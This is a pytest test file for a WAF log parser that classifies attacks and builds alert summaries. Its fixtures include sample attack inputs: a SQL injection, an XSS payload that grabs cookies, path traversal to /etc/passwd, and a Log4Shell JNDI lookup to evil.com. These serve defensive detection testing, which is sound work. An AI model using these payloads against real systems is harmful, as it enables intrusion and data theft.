"""Tests for WAF log parser and attack classifier."""
import json
import gzip
import pytest
from datetime import datetime, timezone

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))
from log_parser import parse_waf_log_line, build_alert_payload


def make_waf_log_line(action: str = 'ALLOW', client_ip: str = '10.0.0.1',
                       uri: str = '/api/test', country: str = 'US',
                       method: str = 'GET') -> str:
    return json.dumps({
        'timestamp': '1705280400000',
        'action': action,
        'httpRequest': {
            'clientIp': client_ip,
            'country': country,
            'uri': uri,
            'httpMethod': method,
            'queryString': '',
            'headers': [{'name': 'User-Agent', 'value': 'Mozilla/5.0'}],
        },
        'terminatingRuleMatchDetails': [],
        'nonTerminatingMatchingRules': [],
    })


class TestLogLineParsing:

    def test_blocked_request_parsed(self):
        line = make_waf_log_line(action='BLOCK', client_ip='1.2.3.4')
        event = parse_waf_log_line(line)
        assert event is not None
        assert event.blocked is True
        assert event.client_ip == '1.2.3.4'

    def test_allowed_request_not_blocked(self):
        line = make_waf_log_line(action='ALLOW')
        event = parse_waf_log_line(line)
        assert event.blocked is False

    def test_sql_injection_classified(self):
        line = make_waf_log_line(uri="/login?id=1' UNION SELECT * FROM users--")
        event = parse_waf_log_line(line)
        assert event.attack_type == 'SQL_INJECTION'
        assert event.attack_severity == 'CRITICAL'

    def test_xss_classified(self):
        line = make_waf_log_line(uri='/search?q=<script>alert(document.cookie)</script>')
        event = parse_waf_log_line(line)
        assert event.attack_type == 'XSS'
        assert event.attack_severity == 'HIGH'

    def test_path_traversal_classified(self):
        line = make_waf_log_line(uri='/files/../../etc/passwd')
        event = parse_waf_log_line(line)
        assert event.attack_type == 'PATH_TRAVERSAL'

    def test_log4shell_classified(self):
        line = make_waf_log_line(uri='/api?input=${jndi:ldap://evil.com/x}')
        event = parse_waf_log_line(line)
        assert event.attack_type == 'LOG4SHELL'
        assert event.attack_severity == 'CRITICAL'

    def test_scanner_ua_classified(self):
        line = json.dumps({
            'timestamp': '1705280400000',
            'action': 'BLOCK',
            'httpRequest': {
                'clientIp': '5.6.7.8', 'country': 'US',
                'uri': '/login', 'httpMethod': 'POST',
                'queryString': '',
                'headers': [{'name': 'User-Agent', 'value': 'sqlmap/1.7.8'}],
            },
            'terminatingRuleMatchDetails': [],
            'nonTerminatingMatchingRules': [],
        })
        event = parse_waf_log_line(line)
        # The URI /login won't match scanner UA patterns (those are in the URI patterns)
        # This tests that the parser doesn't crash on scanner UA
        assert event is not None

    def test_clean_request_no_attack_type(self):
        line = make_waf_log_line(uri='/api/v1/products?page=1&limit=20')
        event = parse_waf_log_line(line)
        assert event.attack_type is None

    def test_invalid_json_returns_none(self):
        event = parse_waf_log_line('not valid json {{{')
        assert event is None

    def test_empty_line_returns_none(self):
        event = parse_waf_log_line('')
        assert event is None


class TestAlertPayload:

    def _make_events(self, count: int, blocked: int, attack_type: str = None):
        from log_parser import WAFEvent
        events = []
        for i in range(count):
            e = WAFEvent(
                timestamp='2024-01-15T03:00:00Z',
                action='BLOCK' if i < blocked else 'ALLOW',
                client_ip=f'10.0.0.{i % 255}',
                country='US',
                uri='/test',
                method='GET',
                host='example.com',
                user_agent='Mozilla',
                blocked=(i < blocked),
                attack_type=attack_type if i < blocked else None,
                attack_severity='CRITICAL' if attack_type else None,
            )
            events.append(e)
        return events

    def test_payload_correct_totals(self):
        events = self._make_events(100, 30)
        payload = build_alert_payload(events)
        assert payload['total_requests'] == 100
        assert payload['blocked'] == 30

    def test_block_rate_calculation(self):
        events = self._make_events(100, 25)
        payload = build_alert_payload(events)
        assert payload['block_rate_pct'] == 25.0

    def test_empty_events(self):
        payload = build_alert_payload([])
        assert payload['total_requests'] == 0
        assert payload['blocked'] == 0
        assert payload['block_rate_pct'] == 0
